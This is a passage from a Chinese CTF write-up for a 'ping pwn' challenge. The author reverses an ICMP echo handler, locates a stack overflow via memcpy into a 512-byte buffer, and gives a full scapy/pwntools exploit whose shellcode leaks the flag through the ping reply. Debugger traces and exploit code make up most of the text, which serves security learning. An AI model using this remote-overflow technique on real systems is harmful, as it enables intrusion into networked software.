<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line">send(IP(dst=<span class="string">&quot;10.10.10.10&quot;</span>)/ICMP()/(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x1000</span>))</span><br></pre></td></tr></table></figure>
<ul>
<li>在执行 sub_101F9F 后，程序出现 “a”*0x1000 ，由此判断 sub_101F9F 就是 ICMP Echo Request 函数</li>
<li>那么 sub_101F05 极有可能是 ICMP Echo Reply 函数</li>
</ul>
<p>分析 sub_101F9F 函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_DWORD *__cdecl <span class="title">sub_101F9F</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3, _DWORD *a4)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _DWORD *result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [esp+4h] [ebp-214h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v8[<span class="number">512</span>]; <span class="comment">// [esp+8h] [ebp-210h] BYREF 这里可能有溢出</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// [esp+208h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// [esp+20Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a2 &gt; <span class="number">13</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v10 = a1;</span><br><span class="line">    v5 = *(<span class="keyword">unsigned</span> __int16 *)(a1 + <span class="number">12</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v5 == <span class="number">8</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_102214(v10 + <span class="number">14</span>, a2 - <span class="number">14</span>, (<span class="keyword">int</span>)v8, &amp;v7);<span class="comment">// 跟进这个函数,查看v8的值</span></span><br><span class="line">    &#125;</span><br><span class="line">      ......</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = a4;</span><br><span class="line">    *a4 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>这个 v8 十分可疑，所以先进入 sub_102214 函数分析 v8 的逻辑</li>
<li>sub_102214 函数中有个 memcpy，在 GDB 中查看它的信息：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">───────────────────────────────────[ DISASM ]───────────────────────────────────</span><br><span class="line"> ► <span class="number">0x10233f</span>    call   <span class="number">0x108aa9</span>                      &lt;<span class="number">0x108aa9</span>&gt; <span class="comment">/* memcpy */</span></span><br><span class="line"> </span><br><span class="line">   <span class="number">0x102344</span>    add    esp, <span class="number">0x10</span></span><br><span class="line">   <span class="number">0x102347</span>    mov    eax, dword ptr [ebp + <span class="number">0x10</span>]</span><br><span class="line">   <span class="number">0x10234a</span>    mov    dword ptr [ebp - <span class="number">0x18</span>], eax</span><br><span class="line">   <span class="number">0x10234d</span>    mov    eax, dword ptr [ebp - <span class="number">0x18</span>]</span><br><span class="line">   <span class="number">0x102350</span>    movzx  edx, byte ptr [eax]</span><br><span class="line">   <span class="number">0x102353</span>    <span class="keyword">and</span>    edx, <span class="number">0xf</span></span><br><span class="line">   <span class="number">0x102356</span>    <span class="keyword">or</span>     edx, <span class="number">0x40</span></span><br><span class="line">   <span class="number">0x102359</span>    mov    byte ptr [eax], dl</span><br><span class="line">   <span class="number">0x10235b</span>    mov    eax, dword ptr [ebp - <span class="number">0x18</span>]</span><br><span class="line">   <span class="number">0x10235e</span>    movzx  edx, byte ptr [eax]</span><br><span class="line">───────────────────────────────────[ STACK ]────────────────────────────────────</span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ esp <span class="number">0x1907d78</span> —▸ <span class="number">0x1907dd8</span> —▸ <span class="number">0x20a0a0a</span> —▸ <span class="number">0</span> —▸ <span class="number">0xf000ff53</span> ◂— ...</span><br><span class="line"><span class="number">01</span>:<span class="number">0004</span>│     <span class="number">0x1907d7c</span> —▸ <span class="number">0x10c8d2</span> —▸ <span class="number">0</span> —▸ <span class="number">0xf000ff53</span> ◂— <span class="number">0</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0008</span>│     <span class="number">0x1907d80</span> —▸ <span class="number">0x5c4</span> —▸ <span class="number">0</span> —▸ <span class="number">0xf000ff53</span> ◂— <span class="number">0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">000</span>c│     <span class="number">0x1907d84</span> —▸ <span class="number">0xdc05</span> —▸ <span class="number">0x12cec81</span> —▸ <span class="number">0</span> —▸ <span class="number">0xf000ff53</span> ◂— ...</span><br><span class="line"><span class="number">04</span>:<span class="number">0010</span>│     <span class="number">0x1907d88</span> —▸ <span class="number">0</span> —▸ <span class="number">0xf000ff53</span> ◂— <span class="number">0</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0014</span>│     <span class="number">0x1907d8c</span> —▸ <span class="number">0x1907dd4</span> —▸ <span class="number">0xf4f40000</span> —▸ <span class="number">0</span> —▸ <span class="number">0xf000ff53</span> ◂— ...</span><br><span class="line"><span class="number">06</span>:<span class="number">0018</span>│     <span class="number">0x1907d90</span> —▸ <span class="number">0x10c8ce</span> —▸ <span class="number">0xf4ec0008</span> —▸ <span class="number">0</span> —▸ <span class="number">0xf000ff53</span> ◂— ...</span><br><span class="line"><span class="number">07</span>:<span class="number">001</span>c│     <span class="number">0x1907d94</span> —▸ <span class="number">0x5dc05c8</span> —▸ <span class="number">0</span> —▸ <span class="number">0xf000ff53</span> ◂— <span class="number">0</span></span><br><span class="line">─────────────────────────────────[ BACKTRACE ]──────────────────────────────────</span><br><span class="line"> ► f <span class="number">0</span> <span class="number">0x10233f</span></span><br><span class="line">   f <span class="number">1</span> <span class="number">0x10202b</span></span><br><span class="line">   f <span class="number">2</span> <span class="number">0x10014b</span></span><br><span class="line">────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; x /<span class="number">20</span>gx <span class="number">0x10c8d2</span></span><br><span class="line"><span class="number">0x10c8d2</span>:	<span class="number">0x6161616100000000</span>	<span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x10c8e2</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x10c8f2</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x10c902</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x10c912</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></span><br></pre></td></tr></table></figure>
<ul>
<li>memcpy(0x1907dd8 ,0x10c8d2 ,0x5c4)：把 ping 的数据复制到栈上的一个地址</li>
<li>执行到 ret 指令前，看看 offset 为多少：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">───────────────────────────────────[ DISASM ]───────────────────────────────────</span><br><span class="line"> ► <span class="number">0x1020c5</span>    ret    &lt;<span class="number">0x10014b</span>&gt;</span><br><span class="line">    ↓</span><br><span class="line">   <span class="number">0x10014b</span>    add    esp, <span class="number">0x10</span></span><br><span class="line">   <span class="number">0x10014e</span>    mov    eax, <span class="number">0x10c264</span></span><br><span class="line">   <span class="number">0x100154</span>    mov    dword ptr [eax], <span class="number">0</span></span><br><span class="line">   <span class="number">0x10015a</span>    mov    eax, <span class="number">0x10c878</span></span><br><span class="line">   <span class="number">0x100160</span>    mov    eax, dword ptr [eax]</span><br><span class="line">   <span class="number">0x100162</span>    test   eax, eax</span><br><span class="line">   <span class="number">0x100164</span>    je     <span class="number">0x10018d</span>                      &lt;<span class="number">0x10018d</span>&gt;</span><br><span class="line"> </span><br><span class="line">   <span class="number">0x100166</span>    mov    eax, <span class="number">0x10c878</span></span><br><span class="line">   <span class="number">0x10016c</span>    mov    eax, dword ptr [eax]</span><br><span class="line">   <span class="number">0x10016e</span>    sub    esp, <span class="number">8</span></span><br><span class="line">───────────────────────────────────[ STACK ]────────────────────────────────────</span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ esp <span class="number">0x1907fd4</span> —▸ <span class="number">0x10014b</span> —▸ <span class="number">0xc710c483</span> —▸ <span class="number">0</span> —▸ <span class="number">0xf000ff53</span> ◂— ...</span><br><span class="line"><span class="number">01</span>:<span class="number">0004</span>│     <span class="number">0x1907fd8</span> —▸ <span class="number">0x10c8ac</span> —▸ <span class="number">0xffffffff</span> —▸ <span class="number">0xff5300</span> —▸ <span class="number">0</span> ◂— ...</span><br><span class="line"><span class="number">02</span>:<span class="number">0008</span>│     <span class="number">0x1907fdc</span> —▸ <span class="number">42</span> —▸ <span class="number">0xd442f000</span> —▸ <span class="number">0</span> —▸ <span class="number">0xf000ff53</span> ◂— ...</span><br><span class="line"><span class="number">03</span>:<span class="number">000</span>c│     <span class="number">0x1907fe0</span> —▸ <span class="number">0x10c280</span> —▸ <span class="number">0x1e0f4e06</span> —▸ <span class="number">0</span> —▸ <span class="number">0xf000ff53</span> ◂— ...</span><br><span class="line"><span class="number">04</span>:<span class="number">0010</span>│     <span class="number">0x1907fe4</span> —▸ <span class="number">0x10c878</span> —▸ <span class="number">42</span> —▸ <span class="number">0xd442f000</span> —▸ <span class="number">0</span> ◂— ...</span><br><span class="line"><span class="number">05</span>:<span class="number">0014</span>│     <span class="number">0x1907fe8</span> —▸ <span class="number">0</span> —▸ <span class="number">0xf000ff53</span> ◂— <span class="number">0</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0018</span>│     <span class="number">0x1907fec</span> —▸ <span class="number">0x10000</span> —▸ <span class="number">0x1a67</span> —▸ <span class="number">0</span> —▸ <span class="number">0xf000ff53</span> ◂— ...</span><br><span class="line"><span class="number">07</span>:<span class="number">001</span>c│ ebp <span class="number">0x1907ff0</span> —▸ <span class="number">0</span> —▸ <span class="number">0xf000ff53</span> ◂— <span class="number">0</span></span><br><span class="line">─────────────────────────────────[ BACKTRACE ]──────────────────────────────────</span><br><span class="line"> ► f <span class="number">0</span> <span class="number">0x1020c5</span></span><br><span class="line">   f <span class="number">1</span> <span class="number">0x10014b</span></span><br><span class="line">────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; distance <span class="number">0x1907fd4</span> <span class="number">0x1907dd8</span></span><br><span class="line"><span class="number">0x1907fd4</span>-&gt;<span class="number">0x1907dd8</span> is <span class="number">-0x1fc</span> bytes (<span class="number">-0x7f</span> words)</span><br></pre></td></tr></table></figure>
<ul>
<li>为了尽量不破坏栈帧，我们需要尽可能收集 esp 之前的数据</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x1907fd4</span><span class="number">-0x20</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x1907fb4</span> —▸ <span class="number">0x1083d6</span> —▸ <span class="number">0x8b10c483</span> —▸ <span class="number">0</span> —▸ <span class="number">0xf000ff53</span> ◂— ...</span><br><span class="line"><span class="number">01</span>:<span class="number">0004</span>│  <span class="number">0x1907fb8</span> —▸ <span class="number">0</span> —▸ <span class="number">0xf000ff53</span> ◂— <span class="number">0</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0008</span>│  <span class="number">0x1907fbc</span> —▸ <span class="number">0x1907fdc</span> —▸ <span class="number">42</span> —▸ <span class="number">0xd442f000</span> —▸ <span class="number">0</span> ◂— ...</span><br><span class="line"><span class="number">03</span>:<span class="number">000</span>c│  <span class="number">0x1907fc0</span> —▸ <span class="number">0x10c280</span> —▸ <span class="number">0x1e0f4e06</span> —▸ <span class="number">0</span> —▸ <span class="number">0xf000ff53</span> ◂— ...</span><br><span class="line"><span class="number">04</span>:<span class="number">0010</span>│  <span class="number">0x1907fc4</span> —▸ <span class="number">0x10c8ac</span> —▸ <span class="number">0xffffffff</span> —▸ <span class="number">0xff5300</span> —▸ <span class="number">0</span> ◂— ...</span><br><span class="line"><span class="number">05</span>:<span class="number">0014</span>│  <span class="number">0x1907fc8</span> —▸ <span class="number">0x10a6b4</span> —▸ <span class="number">0</span> —▸ <span class="number">0xf000ff53</span> ◂— <span class="number">0</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0018</span>│  <span class="number">0x1907fcc</span> —▸ <span class="number">0x10a6b4</span> —▸ <span class="number">0</span> —▸ <span class="number">0xf000ff53</span> ◂— <span class="number">0</span></span><br><span class="line"><span class="number">07</span>:<span class="number">001</span>c│  <span class="number">0x1907fd0</span> —▸ <span class="number">0x1907ff0</span> —▸ <span class="number">0</span> —▸ <span class="number">0xf000ff53</span> ◂— <span class="number">0</span></span><br><span class="line"><span class="number">08</span>:<span class="number">0020</span>│ esp <span class="number">0x1907fd4</span> —▸ <span class="number">0x10014b</span> —▸ <span class="number">0xc710c483</span> —▸ <span class="number">0</span> —▸ <span class="number">0xf000ff53</span> ◂— ...</span><br><span class="line"><span class="number">09</span>:<span class="number">0024</span>│     <span class="number">0x1907fd8</span> —▸ <span class="number">0x10c8ac</span> —▸ <span class="number">0xffffffff</span> —▸ <span class="number">0xff5300</span> —▸ <span class="number">0</span> ◂— ...</span><br><span class="line"><span class="number">0</span>a:<span class="number">0028</span>│     <span class="number">0x1907fdc</span> —▸ <span class="number">42</span> —▸ <span class="number">0xd442f000</span> —▸ <span class="number">0</span> —▸ <span class="number">0xf000ff53</span> ◂— ...</span><br><span class="line"><span class="number">0b</span>:<span class="number">002</span>c│     <span class="number">0x1907fe0</span> —▸ <span class="number">0x10c280</span> —▸ <span class="number">0x1e0f4e06</span> —▸ <span class="number">0</span> —▸ <span class="number">0xf000ff53</span> ◂— ...</span><br><span class="line"><span class="number">0</span>c:<span class="number">0030</span>│     <span class="number">0x1907fe4</span> —▸ <span class="number">0x10c878</span> —▸ <span class="number">42</span> —▸ <span class="number">0xd442f000</span> —▸ <span class="number">0</span> ◂— ...</span><br><span class="line"><span class="number">0</span>d:<span class="number">0034</span>│     <span class="number">0x1907fe8</span> —▸ <span class="number">0</span> —▸ <span class="number">0xf000ff53</span> ◂— <span class="number">0</span></span><br><span class="line"><span class="number">0</span>e:<span class="number">0038</span>│     <span class="number">0x1907fec</span> —▸ <span class="number">0x10000</span> —▸ <span class="number">0x1a67</span> —▸ <span class="number">0</span> —▸ <span class="number">0xf000ff53</span> ◂— ...</span><br><span class="line"><span class="number">0f</span>:<span class="number">003</span>c│ ebp <span class="number">0x1907ff0</span> —▸ <span class="number">0</span> —▸ <span class="number">0xf000ff53</span> ◂— <span class="number">0</span></span><br></pre></td></tr></table></figure>
<p>测试代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">payload  = <span class="string">b&#x27;a&#x27;</span> * <span class="number">10</span>  </span><br><span class="line">payload += shellcode.ljust(<span class="number">478</span>,<span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">payload += p32(<span class="number">0x10C8Ac</span>) </span><br><span class="line">payload += p32(<span class="number">0x10a6b4</span>)</span><br><span class="line">payload += p32(<span class="number">0x10a6b4</span>)</span><br><span class="line">payload += p32(<span class="number">0x1907ff0</span>)</span><br><span class="line">payload += p32(<span class="number">0x10c8e0</span>) <span class="comment"># shellcode addr</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;payload &gt;&gt; &quot;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>(payload)))</span><br></pre></td></tr></table></figure>
<p>最后只需要写一个 shellcode 就解决问题了：</p>
<ul>
<li>我最开始的想法是直接执行 printf 把 flag 打印出来，后来发现 run.sh 中有 <code>-display none</code>，即使真的打印出来了也看不见（其实我把 <code>-display none</code> 去掉以后，也没能成功）</li>
<li>后来参考了网上的做法：因为我们和目标系统只有 ping 包的通信，并且可以收到 ping 的回包，所以利用 shellcode 把 flag 写到 ICMP 的 echo 报文中，然后在 ping 的回包中查看 flag</li>
</ul>
<p>完整 exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;x86&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    // memcpy(0x10c370,0x350000,0x20)</span></span><br><span class="line"><span class="string">    push 0x20</span></span><br><span class="line"><span class="string">    push 0x350000</span></span><br><span class="line"><span class="string">    push 0x10c370</span></span><br><span class="line"><span class="string">    mov  eax, 0x108AA9</span></span><br><span class="line"><span class="string">    call eax</span></span><br><span class="line"><span class="string">    add  esp, 0xc</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov  eax, 0x10014B</span></span><br><span class="line"><span class="string">    jmp  eax</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload  = <span class="string">b&#x27;a&#x27;</span> * <span class="number">10</span></span><br><span class="line">payload += shellcode.ljust(<span class="number">478</span>,<span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">payload += p32(<span class="number">0x10C8Ac</span>) </span><br><span class="line">payload += p32(<span class="number">0x10a6b4</span>)</span><br><span class="line">payload += p32(<span class="number">0x10a6b4</span>)</span><br><span class="line">payload += p32(<span class="number">0x1907ff0</span>)</span><br><span class="line">payload += p32(<span class="number">0x10c8e0</span>) </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;payload &gt;&gt; &quot;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line"></span><br><span class="line">p = sr1(IP(dst=<span class="string">&quot;10.10.10.10&quot;</span>)/ICMP()/payload)</span><br><span class="line"><span class="built_in">print</span>(p)</span><br></pre></td></tr></table></figure>
<hr>
<p><strong>小结：</strong></p>
<p>第一次遇到这种题目，学到了很多关于 web 的知识：</p>
<ul>
<li>配置虚拟网卡</li>
<li>iptables 的使用</li>
<li>ICMP 协议及其类型字段</li>
<li>死亡之 ping</li>
</ul>
<p>最后这个题目卡在了 shellcode 上，我参考了网上某个大佬的 wp 才搞出来，大佬最后还计算了效验和，不过我没有计算效验和也拿到 flag 了</p>
<p>之后就一直在调试效验和，验证 sub_1023E3 函数的功能，但是 GDB 中它调用时候没有起到预期的效果，而最终抓包却显示结果正常</p>

    </div>

    
    
    

      <footer class="post-footer">
          
          <div class="post-tags">
              <a href="/tags/ping-pwn/" rel="tag"><i class="fa fa-tag"></i> ping pwn</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2022/07/12/KVM%20pwn/" rel="prev" title="KVM pwn">
      <i class="fa fa-chevron-left"></i> KVM pwn
    </a></div>
      <div class="post-nav-item">
    <a href="/2022/07/21/DSCTF2022/" rel="next" title="DSCTF2022">
      DSCTF2022 <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="yhellow"
      src="/images/avatar.gif">
  <p class="site-author-name" itemprop="name">yhellow</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">331</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">13</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">170</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 2019 – 
  <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">yhellow</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
    <span title="Symbols count total">4.9m</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="Reading time total">74:46</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
  </div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

  

</body>
</html>
